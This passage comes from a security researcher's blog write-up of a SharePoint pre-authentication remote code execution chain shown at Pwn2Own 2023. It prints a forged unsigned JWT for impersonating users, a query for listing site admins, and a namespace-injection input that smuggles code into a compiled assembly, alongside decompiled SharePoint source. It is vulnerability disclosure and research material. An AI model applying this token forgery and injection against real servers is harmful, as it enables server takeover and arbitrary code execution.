class="mi">4</span><span class="err">iLCJlbmRwb</span><span class="mi">2</span><span class="err">ludHVybCI</span><span class="mi">6</span><span class="err">ICJGVkl</span><span class="mi">3</span><span class="err">QldUdXVXZnN</span><span class="mi">6</span><span class="err">TzdXWVJaWWlvek</span><span class="mi">1</span><span class="err">lOE</span><span class="mi">9</span><span class="err">hU</span><span class="mi">2</span><span class="err">FXTy</span><span class="mi">93</span><span class="err">eURSM</span><span class="mi">1</span><span class="err">c</span><span class="mi">2</span><span class="err">ZTk</span><span class="mi">0</span><span class="err">PSIsIm</span><span class="mi">5</span><span class="err">hbWUiOiJmI</span><span class="mi">3</span><span class="err">h</span><span class="mi">3</span><span class="err">fEFkbWluaXN</span><span class="mi">0</span><span class="err">cmF</span><span class="mi">0</span><span class="err">b</span><span class="mi">3</span><span class="err">IiLCJpZGVudGl</span><span class="mi">0</span><span class="err">eXByb</span><span class="mi">3</span><span class="err">ZpZGVyIjoid</span><span class="mi">2</span><span class="err">luZE</span><span class="mi">93</span><span class="err">czphYWFhYSIsInVzZXJpZCI</span><span class="mi">6</span><span class="err">ImFzYWFkYXNkIn</span><span class="mi">0</span><span class="err">.YWFh</span>
</span></span></code></pre></div><p>The Base64-decoded portions of the spoofed JWT token is shown below:</p>
<ul>
<li>Header: <code>{"alg": "none"}</code></li>
<li>Payload: <code>{"iss":"00000003-0000-0ff1-ce00-000000000000","aud":  "00000003-0000-0ff1-ce00-000000000000/splab@3b80be6c-6741-4135-9292-afed8df596af","nbf":"1673410334","exp":"1693410334","nameid":"c#.w|Administrator",   "http://schemas.microsoft.com/sharepoint/2009/08/claims/userlogonname":"Administrator",   "appidacr":"0", "isuser":"0", "http://schemas.microsoft.com/office/2012/01/nameidissuer":"AccessToken",  "ver":"hashedprooftoken","endpointurl": "FVIwBWTuuWfszO7WYRZYiozMe8OaSaWO/wyDR3W6e94=","name":"f#xw|Administrator","identityprovider":"windOws:aaaaa","userid":"asaadasdIn0</code></li>
</ul>
<p>Note that the <code>nameid</code> field will need to be modified to impersonate the corresponding user in the SharePoint site.</p>
<hr>
<p>So we‚Äôve got an authentication bypass, but it may require to know at least one username exists in the SharePoint site. If not, SharePoint Site will reject the authentication and we can‚Äôt access to any feature.
At first, I thought that problem was easy to solve because the user ‚ÄúAdministrator‚Äù exists in every windows server 2022 instance. 
But it‚Äôs not!
.
.
Yes, we can assume that user ‚ÄúAdministrator‚Äù exists in every windows server 2022 instance, but that‚Äôs not what we need.
With a correctly configured SharePoint instance:</p>
<ul>
<li>The SharePoint Service user should not be a ‚Äúbuilt-in administrators‚Äù</li>
<li>Also the Site Admin user should not be the ‚Äúbuilt-in administrators‚Äù</li>
<li>Only the ‚ÄúFarm Administrator‚Äù need to be the ‚Äúbuilt-in administrators‚Äù of the SharePoint Server</li>
</ul>
<p>That means in the Pwn2Own setup, the ‚ÄúAdministrator‚Äù account will not be a SharePoint Site Member.</p>
<p>This part of the exploit took me a few days of reading ZDI‚Äôs series blog post about SharePoint again and again, until i realized this line:
<img loading="lazy" src="./[P2O Vancouver 2023] SharePoint Pre-Auth RCE chain (CVE-2023‚Äì29357 &amp; CVE-2023‚Äì24955) _ STAR Labs_files/09-SharePoint-Pre-Auth-RCE-chain_zdiblog.png" alt="">
</p>
<p>This entrypoint <code>/my</code> didn‚Äôt exist in my SharePoint instance. 
After searching for a while, I‚Äôve found out they (team ZDI) use the <strong>Initial Farm Configuration Wizard</strong> to setup the SharePoint server instead of configuring it manually (like what i thought/did).
While using the <strong>Initial Farm Configuration Wizard</strong>, many other feature will be enabled, <strong>User Profile Service</strong> is the service responsible for the entrypoint <code>/my</code>.
This entrypoint has the <code>Read Permission</code> granted to <code>Authenticated users</code>, which mean any <code>authenticated users</code> can access to this site, get user list and admin username.</p>
<p><img loading="lazy" src="./[P2O Vancouver 2023] SharePoint Pre-Auth RCE chain (CVE-2023‚Äì29357 &amp; CVE-2023‚Äì24955) _ STAR Labs_files/09-SharePoint-Pre-Auth-RCE-chain_mysite.png" alt="">
</p>
<p>By using the authentication bypass in <code>My Site</code> site,</p>
<ul>
<li>At first request, we can first impersonate any users on windows, even local users like <code>NT AUTHORITY\LOCAL SERVICE</code>, <code>NT AUTHORITY\SYSTEM</code>.</li>
<li>After authenticated, get site admin by using ListData service at: <code>/my/_vti_bin/listdata.svc/UserInformationList?$filter=IsSiteAdmin eq true</code></li>
</ul>
<p>Then we can impersonate Site Admin user and perform any further action!</p>
<h2 id="vulnerability-2-code-injection-in-dynamicproxygeneratorgenerateproxyassembly">Vulnerability #2: Code Injection in DynamicProxyGenerator.GenerateProxyAssembly()<a hidden="" class="anchor" aria-hidden="true" href="https://starlabs.sg/blog/2023/09-sharepoint-pre-auth-rce-chain/#vulnerability-2-code-injection-in-dynamicproxygeneratorgenerateproxyassembly">#</a></h2>
<p>As mentioned at the beginning, although we can impersonate as any user, but limited only in SharePoint API. 
I‚Äôve been searching back old SharePoint vuln but can‚Äôt find any vulnerability that reachable via API (or at least i don‚Äôt know how at that time).
Well, then it took me half of 2022 to read SharePoint API source code and end up with this vulnerability!
The code injection vulnerability exists in <code>DynamicProxyGenerator.GenerateProxyAssembly()</code> method. The relevant portion of the aforesaid method‚Äôs implementation is shown below:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-csharp hljs" data-lang="csharp"><span class="line"><span class="cl"><span class="c1"><span class="hljs-comment">//Microsoft.SharePoint.BusinessData.SystemSpecific.WebService.DynamicProxyGenerator</span></span>
</span></span><span class="line"><span class="cl"><span class="k"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span><span class="k"><span class="hljs-function"><span class="hljs-keyword">virtual</span></span></span><span class="hljs-function"> </span><span class="n"><span class="hljs-function">Assembly</span></span><span class="hljs-function"> </span><span class="n"><span class="hljs-function"><span class="hljs-title">GenerateProxyAssembly</span></span></span><span class="p"><span class="hljs-function">(</span></span><span class="n"><span class="hljs-function"><span class="hljs-params">DiscoveryClientDocumentCollection</span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="n"><span class="hljs-function"><span class="hljs-params">serviceDescriptionDocuments</span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">,</span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="kt"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">string</span></span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="n"><span class="hljs-function"><span class="hljs-params">proxyNamespaceName</span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">,</span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="kt"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">string</span></span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="n"><span class="hljs-function"><span class="hljs-params">assemblyPathAndName</span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">,</span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="kt"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">string</span></span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="n"><span class="hljs-function"><span class="hljs-params">protocolName</span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">,</span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="k"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">out</span></span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="kt"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">string</span></span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="n"><span class="hljs-function"><span class="hljs-params">sourceCode</span></span></span><span class="p"><span class="hljs-function">)</span></span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="c1"><span class="hljs-comment">//...</span></span>
</span></span><span class="line"><span class="cl">  <span class="n">CodeNamespace</span> <span class="n">codeNamespace</span> <span class="p">=</span> <span class="k"><span class="hljs-keyword">new</span></span> <span class="n">CodeNamespace</span><span class="p">(</span><span class="n">proxyNamespaceName</span><span class="p">);</span> <span class="c1"><span class="hljs-comment">// [17]</span></span>
</span></span><span class="line"><span class="cl">  <span class="c1"><span class="hljs-comment">//...</span></span>
</span></span><span class="line"><span class="cl">  <span class="n">CodeCompileUnit</span> <span class="n">codeCompileUnit</span> <span class="p">=</span> <span class="k"><span class="hljs-keyword">new</span></span> <span class="n">CodeCompileUnit</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="n">codeCompileUnit</span><span class="p">.</span><span class="n">Namespaces</span><span class="p">.</span><span class="n">Add</span><span class="p">(</span><span class="n">codeNamespace</span><span class="p">);</span> <span class="c1"><span class="hljs-comment">// [18]</span></span>
</span></span><span class="line"><span class="cl">  <span class="n">codeCompileUnit</span><span class="p">.</span><span class="n">ReferencedAssemblies</span><span class="p">.</span><span class="n">Add</span><span class="p">(</span><span class="s"><span class="hljs-string">"System.dll"</span></span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="c1"><span class="hljs-comment">//...</span></span>
</span></span><span class="line"><span class="cl">  <span class="n">CodeDomProvider</span> <span class="n">codeDomProvider</span> <span class="p">=</span> <span class="n">CodeDomProvider</span><span class="p">.</span><span class="n">CreateProvider</span><span class="p">(</span><span class="s"><span class="hljs-string">"CSharp"</span></span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">StringCollection</span> <span class="n">stringCollection</span> <span class="p">=</span> <span class="k"><span class="hljs-literal">null</span></span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="c1"><span class="hljs-comment">//...</span></span>
</span></span><span class="line"><span class="cl">  <span class="k"><span class="hljs-keyword">using</span></span> <span class="p">(</span><span class="n">TextWriter</span> <span class="n">textWriter</span> <span class="p">=</span> <span class="k"><span class="hljs-keyword">new</span></span> <span class="n">StringWriter</span><span class="p">(</span><span class="k"><span class="hljs-keyword">new</span></span> <span class="n">StringBuilder</span><span class="p">(),</span> <span class="n">CultureInfo</span><span class="p">.</span><span class="n">InvariantCulture</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">CodeGeneratorOptions</span> <span class="n">codeGeneratorOptions</span> <span class="p">=</span> <span class="k"><span class="hljs-keyword">new</span></span> <span class="n">CodeGeneratorOptions</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="n">codeDomProvider</span><span class="p">.</span><span class="n">GenerateCodeFromCompileUnit</span><span class="p">(</span><span class="n">codeCompileUnit</span><span class="p">,</span> <span class="n">textWriter</span><span class="p">,</span> <span class="n">codeGeneratorOptions</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">textWriter</span><span class="p">.</span><span class="n">Flush</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="n">sourceCode</span> <span class="p">=</span> <span class="n">textWriter</span><span class="p">.</span><span class="n">ToString</span><span class="p">();</span> <span class="c1"><span class="hljs-comment">// [19]</span></span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="n">CompilerResults</span> <span class="n">compilerResults</span> <span class="p">=</span> <span class="n">codeDomProvider</span><span class="p">.</span><span class="n">CompileAssemblyFromDom</span><span class="p">(</span><span class="n">compilerParameters</span><span class="p">,</span> <span class="k"><span class="hljs-keyword">new</span></span> <span class="n">CodeCompileUnit</span><span class="p">[]</span> <span class="p">{</span> <span class="n">codeCompileUnit</span> <span class="p">});</span> <span class="c1"><span class="hljs-comment">// [20]</span></span>
</span></span><span class="line"><span class="cl">  <span class="c1"><span class="hljs-comment">//...</span></span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>The main logic of this method is to generate an <code>Assembly</code> with the <code>proxyNameSpace</code>. At <strong>[17]</strong>, an instance of <code>CodeNamespace</code> is initialized using the <code>proxyNamespaceName</code> parameter. This <code>CodeNamespace</code> instance is then added to <code>codeCompileUnit.Namespaces</code> at <strong>[18]</strong>.
After that, at <strong>[19]</strong>, <code>codeDomProvider.GenerateCodeFromCompileUnit()</code> will generate the source code using the aforesaid <code>codeCompileUnit</code> which included our <code>proxyNamespaceName</code>, storing the source code in the variable <code>sourceCode</code>.</p>
<p>It was discovered that no validation is done for the <code>proxyNamespaceName</code> parameter. Consequently, by supplying malicious input as the <code>proxyNamespaceName</code> parameter, arbitrary contents can be injected into the code to be compiled for the <code>Assembly</code> to be generated at <strong>[20]</strong>.</p>
<p>For example:</p>
<ul>
<li>If <code>proxyNamespaceName</code> is <code>Foo</code>, then the generated code is:</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-csharp hljs" data-lang="csharp"><span class="line"><span class="cl"><span class="k"><span class="hljs-keyword">namespace</span></span> <span class="nn"><span class="hljs-title">Foo</span></span><span class="p">{}</span>
</span></span></code></pre></div><ul>
<li>But if a malicious input such as <code>Hacked{} namespace Foo</code> is supplied for the <code>proxyNamespaceName</code> parameter, the following code is generated and compiled:</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-csharp hljs" data-lang="csharp"><span class="line"><span class="cl"><span class="k"><span class="hljs-keyword">namespace</span></span> <span class="nn"><span class="hljs-title">Hacked</span></span><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="c1"><span class="hljs-comment">//Malicious code</span></span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k"><span class="hljs-keyword">namespace</span></span> <span class="nn"><span class="hljs-title">Foo</span></span><span class="p">{}</span>
</span></span></code></pre></div><p>The <code>DynamicProxyGenerator.GenerateProxyAssembly()</code> method is invoked via reflection in <code>WebServiceSystemUtility.GenerateProxyAssembly()</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-csharp hljs" data-lang="csharp"><span class="line"><span class="cl"><span class="na">[<span class="hljs-meta">PermissionSet(SecurityAction.Assert, Name = <span class="hljs-meta-string">"FullTrust"</span>)</span>]</span>
</span></span><span class="line"><span class="cl"><span class="k"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span><span class="k"><span class="hljs-function"><span class="hljs-keyword">virtual</span></span></span><span class="hljs-function"> </span><span class="n"><span class="hljs-function">ProxyGenerationResult</span></span><span class="hljs-function"> </span><span class="n"><span class="hljs-function"><span class="hljs-title">GenerateProxyAssembly</span></span></span><span class="p"><span class="hljs-function">(</span></span><span class="n"><span class="hljs-function"><span class="hljs-params">ILobSystemStruct</span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="n"><span class="hljs-function"><span class="hljs-params">lobSystemStruct</span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">,</span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="n"><span class="hljs-function"><span class="hljs-params">INamedPropertyDictionary</span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="n"><span class="hljs-function"><span class="hljs-params">lobSystemProperties</span></span></span><span class="p"><span class="hljs-function">)</span></span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="n">AppDomain</span> <span class="n">appDomain</span> <span class="p">=</span> <span class="n">AppDomain</span><span class="p">.</span><span class="n">CreateDomain</span><span class="p">(</span><span class="n">lobSystemStruct</span><span class="p">.</span><span class="n">Name</span><span class="p">,</span> <span class="k"><span class="hljs-keyword">new</span></span> <span class="n">Evidence</span><span class="p">(</span><span class="k"><span class="hljs-keyword">new</span></span> <span class="kt"><span class="hljs-keyword">object</span></span><span class="p">[]</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k"><span class="hljs-keyword">new</span></span> <span class="n">Zone</span><span class="p">(</span><span class="n">SecurityZone</span><span class="p">.</span><span class="n">MyComputer</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span> <span class="k"><span class="hljs-keyword">new</span></span> <span class="kt"><span class="hljs-keyword">object</span></span><span class="p">[</span><span class="m"><span class="hljs-number">0</span></span><span class="p">]),</span> <span class="n">setupInformation</span><span class="p">,</span> <span class="n">permissionSet</span><span class="p">,</span> <span class="k"><span class="hljs-keyword">new</span></span> <span class="n">StrongName</span><span class="p">[</span><span class="m"><span class="hljs-number">0</span></span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">  <span class="kt"><span class="hljs-keyword">object</span></span> <span class="n">dynamicProxyGenerator</span> <span class="p">=</span> <span class="k"><span class="hljs-literal">null</span></span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">SPSecurity</span><span class="p">.</span><span class="n">RunWithElevatedPrivileges</span><span class="p">(</span><span class="k"><span class="hljs-keyword">delegate</span></span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">dynamicProxyGenerator</span> <span class="p">=</span> <span class="n">appDomain</span><span class="p">.</span><span class="n">CreateInstanceAndUnwrap</span><span class="p">(</span><span class="k"><span class="hljs-keyword">this</span></span><span class="p">.</span><span class="n">GetType</span><span class="p">().</span><span class="n">Assembly</span><span class="p">.</span><span class="n">FullName</span><span class="p">,</span> <span class="s"><span class="hljs-string">"Microsoft.SharePoint.BusinessData.SystemSpecific.WebService.DynamicProxyGenerator"</span></span><span class="p">,</span> <span class="k"><span class="hljs-literal">false</span></span><span class="p">,</span> <span class="n">BindingFlags</span><span class="p">.</span><span class="n">Instance</span> <span class="p">|</span> <span class="n">BindingFlags</span><span class="p">.</span><span class="n">Public</span> <span class="p">|</span> <span class="n">BindingFlags</span><span class="p">.</span><span class="n">NonPublic</span><span class="p">,</span> <span class="k"><span class="hljs-literal">null</span></span><span class="p">,</span> <span class="k"><span class="hljs-literal">null</span></span><span class="p">,</span> <span class="k"><span class="hljs-literal">null</span></span><span class="p">,</span> <span class="k"><span class="hljs-literal">null</span></span><span class="p">,</span> <span class="k"><span class="hljs-literal">null</span></span><span class="p">);</span> <span class="c1"><span class="hljs-comment">// [21]</span></span>
</span></span><span class="line"><span class="cl">  <span class="p">});</span>
</span></span><span class="line"><span class="cl">  <span class="n">Uri</span> <span class="n">uri</span> <span class="p">=</span> <span class="n">WebServiceSystemPropertyParser</span><span class="p">.</span><span class="n">GetUri</span><span class="p">(</span><span class="n">lobSystemProperties</span><span class="p">,</span> <span class="s"><span class="hljs-string">"WsdlFetchUrl"</span></span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="kt"><span class="hljs-keyword">string</span></span> <span class="n">webServiceProxyNamespace</span> <span class="p">=</span> <span class="n">WebServiceSystemPropertyParser</span><span class="p">.</span><span class="n">GetWebServiceProxyNamespace</span><span class="p">(</span><span class="n">lobSystemProperties</span><span class="p">);</span> <span class="c1"><span class="hljs-comment">// [22]</span></span>
</span></span><span class="line"><span class="cl">  <span class="kt"><span class="hljs-keyword">string</span></span> <span class="n">webServiceProxyProtocol</span> <span class="p">=</span> <span class="n">WebServiceSystemPropertyParser</span><span class="p">.</span><span class="n">GetWebServiceProxyProtocol</span><span class="p">(</span><span class="n">lobSystemProperties</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">WebProxy</span> <span class="n">webProxy</span> <span class="p">=</span> <span class="n">WebServiceSystemPropertyParser</span><span class="p">.</span><span class="n">GetWebProxy</span><span class="p">(</span><span class="n">lobSystemProperties</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="kt"><span class="hljs-keyword">object</span></span><span class="p">[]</span> <span class="n">array</span> <span class="p">=</span> <span class="k"><span class="hljs-literal">null</span></span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k"><span class="hljs-keyword">try</span></span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">array</span> <span class="p">=</span> <span class="p">(</span><span class="kt"><span class="hljs-keyword">object</span></span><span class="p">[])</span><span class="n">dynamicProxyGenerator</span><span class="p">.</span><span class="n">GetType</span><span class="p">().</span><span class="n">GetMethod</span><span class="p">(</span><span class="s"><span class="hljs-string">"GenerateProxyAssemblyInfo"</span></span><span class="p">,</span> <span class="n">BindingFlags</span><span class="p">.</span><span class="n">Instance</span> <span class="p">|</span> <span class="n">BindingFlags</span><span class="p">.</span><span class="n">Public</span> <span class="p">|</span> <span class="n">BindingFlags</span><span class="p">.</span><span class="n">NonPublic</span><span class="p">).</span><span class="n">Invoke</span><span class="p">(</span><span class="n">dynamicProxyGenerator</span><span class="p">,</span> <span class="k"><span class="hljs-keyword">new</span></span> <span class="kt"><span class="hljs-keyword">object</span></span><span class="p">[]</span> <span class="p">{</span> <span class="n">uri</span><span class="p">,</span> <span class="n">webServiceProxyNamespace</span><span class="p">,</span> <span class="n">webServiceProxyProtocol</span><span class="p">,</span> <span class="n">webProxy</span><span class="p">,</span> <span class="k"><span class="hljs-literal">null</span></span><span class="p">,</span> <span class="n">httpAuthenticationMode</span><span class="p">,</span> <span class="n">text</span><span class="p">,</span> <span class="n">text2</span> <span class="p">});</span> <span class="c1"><span class="hljs-comment">// [23]</span></span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="c1"><span class="hljs-comment">//...</span></span>
</span></span></code></pre></div><p>The reflection calls can be found at <strong>[21]</strong> and <strong>[23]</strong>.</p>
<p>At <strong>[22]</strong>, notice that the <code>proxyNamespaceName</code> is retrieved from method <code>WebServiceSystemPropertyParser.GetWebServiceProxyNamespace()</code>, which retrieves the <code>WebServiceProxyNamespace</code> property of the current <code>LobSystem</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-csharp hljs" data-lang="csharp"><span class="line"><span class="cl"><span class="k"><span class="hljs-function"><span class="hljs-keyword">internal</span></span></span><span class="hljs-function"> </span><span class="k"><span class="hljs-function"><span class="hljs-keyword">static</span></span></span><span class="hljs-function"> </span><span class="kt"><span class="hljs-function"><span class="hljs-keyword">string</span></span></span><span class="hljs-function"> </span><span class="n"><span class="hljs-function"><span class="hljs-title">GetWebServiceProxyNamespace</span></span></span><span class="p"><span class="hljs-function">(</span></span><span class="n"><span class="hljs-function"><span class="hljs-params">INamedPropertyDictionary</span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="n"><span class="hljs-function"><span class="hljs-params">lobSystemProperties</span></span></span><span class="p"><span class="hljs-function">)</span></span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="c1"><span class="hljs-comment">//...</span></span>
</span></span><span class="line"><span class="cl">  <span class="kt"><span class="hljs-keyword">string</span></span> <span class="n">text</span> <span class="p">=</span> <span class="n">lobSystemProperties</span><span class="p">[</span><span class="s"><span class="hljs-string">"WebServiceProxyNamespace"</span></span><span class="p">]</span> <span class="k"><span class="hljs-keyword">as</span></span> <span class="kt"><span class="hljs-keyword">string</span></span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k"><span class="hljs-keyword">if</span></span> <span class="p">(!</span><span class="kt"><span class="hljs-keyword">string</span></span><span class="p">.</span><span class="n">IsNullOrEmpty</span><span class="p">(</span><span class="n">text</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k"><span class="hljs-keyword">return</span></span> <span class="n">text</span><span class="p">.</span><span class="n">Trim</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="c1"><span class="hljs-comment">//...</span></span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>To reach the <code>WebServiceSystemUtility.GenerateProxyAssembly()</code> method, it was discovered that the <code>Microsoft.SharePoint.BusinessData.MetadataModel.ClientOM.Entity.Execute()</code> method could be used. As explained later on, this <code>Entity.Execute()</code> method can also be used to load the generated <code>Assembly</code> and instantiate a <code>Type</code> within the generated <code>Assembly</code>, thereby allowing for remote code execution.</p>
<p>The relevant code of the <code>Microsoft.SharePoint.BusinessData.MetadataModel.ClientOM.Entity.Execute()</code> method is shown below:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-csharp hljs" data-lang="csharp"><span class="line"><span class="cl"><span class="p">...</span>
</span></span><span class="line"><span class="cl"><span class="na">[<span class="hljs-meta">ClientCallableMethod</span>]</span> <span class="c1"><span class="hljs-comment">// [24]</span></span>
</span></span><span class="line"><span class="cl"><span class="p">...</span>
</span></span><span class="line"><span class="cl"><span class="k"><span class="hljs-function"><span class="hljs-keyword">internal</span></span></span><span class="hljs-function"> </span><span class="n"><span class="hljs-function">MethodExecutionResult</span></span><span class="hljs-function"> </span><span class="n"><span class="hljs-function"><span class="hljs-title">Execute</span></span></span><span class="p"><span class="hljs-function">(<span class="hljs-params">[</span></span></span><span class="n"><span class="hljs-function"><span class="hljs-params">ClientCallableConstraint</span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">(</span></span></span><span class="n"><span class="hljs-function"><span class="hljs-params">FixedId</span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="p"><span class="hljs-function"><span class="hljs-params">=</span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="s"><span class="hljs-function"><span class="hljs-params"><span class="hljs-string">"1"</span></span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">,</span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="n"><span class="hljs-function"><span class="hljs-params">Type</span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="p"><span class="hljs-function"><span class="hljs-params">=</span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="n"><span class="hljs-function"><span class="hljs-params">ClientCallableConstraintType</span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">.</span></span></span><span class="n"><span class="hljs-function"><span class="hljs-params">NotNull</span></span></span><span class="p"><span class="hljs-function">)]</span></span><span class="hljs-function"> </span><span class="p"><span class="hljs-function">[</span></span><span class="n"><span class="hljs-function"><span class="hljs-title">ClientCallableConstraint</span></span></span><span class="p"><span class="hljs-function">(</span></span><span class="n"><span class="hljs-function"><span class="hljs-params">FixedId</span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="p"><span class="hljs-function"><span class="hljs-params">=</span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="s"><span class="hljs-function"><span class="hljs-params"><span class="hljs-string">"2"</span></span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">,</span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="n"><span class="hljs-function"><span class="hljs-params">Type</span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="p"><span class="hljs-function"><span class="hljs-params">=</span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="n"><span class="hljs-function"><span class="hljs-params">ClientCallableConstraintType</span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">.</span></span></span><span class="n"><span class="hljs-function"><span class="hljs-params">NotEmpty</span></span></span><span class="p"><span class="hljs-function">)]</span></span><span class="hljs-function"> </span><span class="kt"><span class="hljs-function"><span class="hljs-keyword">string</span></span></span><span class="hljs-function"> </span><span class="n"><span class="hljs-function">methodInstanceName</span></span><span class="p"><span class="hljs-function">,</span></span><span class="hljs-function"> </span><span class="p"><span class="hljs-function">[</span></span><span class="n"><span class="hljs-function"><span class="hljs-title">ClientCallableConstraint</span></span></span><span class="p"><span class="hljs-function">(</span></span><span class="n"><span class="hljs-function"><span class="hljs-params">FixedId</span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="p"><span class="hljs-function"><span class="hljs-params">=</span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="s"><span class="hljs-function"><span class="hljs-params"><span class="hljs-string">"3"</span></span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">,</span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="n"><span class="hljs-function"><span class="hljs-params">Type</span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="p"><span class="hljs-function"><span class="hljs-params">=</span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="n"><span class="hljs-function"><span class="hljs-params">ClientCallableConstraintType</span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">.</span></span></span><span class="n"><span class="hljs-function"><span class="hljs-params">NotNull</span></span></span><span class="p"><span class="hljs-function">)]</span></span><span class="hljs-function"> </span><span class="n"><span class="hljs-function">LobSystemInstance</span></span><span class="hljs-function"> </span><span class="n"><span class="hljs-function">lobSystemInstance</span></span><span class="p"><span class="hljs-function">,</span></span><span class="hljs-function"> </span><span class="kt"><span class="hljs-function"><span class="hljs-keyword">object</span></span></span><span class="p"><span class="hljs-function">[]</span></span><span class="hljs-function"> </span><span class="n"><span class="hljs-function">inputParams</span></span><span class="p"><span class="hljs-function">)</span></span><span class="hljs-function"> </span><span class="c1"><span class="hljs-function"><span class="hljs-comment">// [25]</span></span></span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k"><span class="hljs-keyword">if</span></span> <span class="p">(((</span><span class="n">ILobSystemInstance</span><span class="p">)</span><span class="n">lobSystemInstance</span><span class="p">).</span><span class="n">GetLobSystem</span><span class="p">().</span><span class="n">SystemType</span> <span class="p">==</span> <span class="n">SystemType</span><span class="p">.</span><span class="n">DotNetAssembly</span><span class="p">)</span> <span class="c1"><span class="hljs-comment">// [26]</span></span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
